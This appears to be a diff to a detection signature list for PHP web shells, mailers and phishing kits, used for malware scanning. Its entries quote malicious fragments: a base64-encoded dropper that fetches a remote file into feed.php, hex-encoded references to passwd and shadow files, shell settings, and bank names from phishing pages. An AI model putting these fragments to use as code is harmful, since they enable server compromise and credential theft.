@@ -1,8 +1,10 @@
 d.fm.p1.value=p1;else d.fm.p1.value=p1_;
 title>HKR1960 Mailer Inbox</title
 default_action = 'FilesMan'
+default_action = "FilesMan"
 default_use_ajax = true
 default_charset = 'Windows-1251'
+default_charset = "Windows-1251"
 { return '127.0.0.1'; }
 ?//BREACK//?
 eval(base64_decode('JGZpbGUgPSBmb3BlbigiZmVlZC5waHAiICwidysiKTsKCiRzYT1maWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy4zcmItc2guY29tL3Byb2plY3RzL3Rvby9mZWVkLnR4dCcpOwoKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsJHNhKTsKCmZjbG9zZSgkZmlsZSk7CgppZiAoJHdyaXRlKSB7CgplY2hvICJTZWN1c$
@@ -146,3 +148,12 @@ firstbanknigeria.com
 Zenith Bank Plc
 Z3NITH
 OOO000000=urldecode
+\x70\x61\x73\x73\x77\x64
+\x72\x6f\x6f\x74
+\x2f\x62\x69\x6e
+\x2f\x73\x68\x61\x64\x6f\x77
+0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0
+milw0rm.com
+print "[+] USER:
+%s%sadmin/index.php?
+You're using NO proxy!
